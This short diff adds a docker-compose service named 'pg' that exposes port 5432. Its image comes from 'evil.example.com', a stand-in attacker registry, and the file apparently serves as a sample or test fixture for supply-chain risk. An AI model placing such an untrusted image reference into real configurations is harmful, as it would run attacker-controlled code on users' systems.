@@ -1,0 +1,4 @@
+services:
+  pg:
+    image: evil.example.com/pg:16
+    ports: ["5432:5432"]
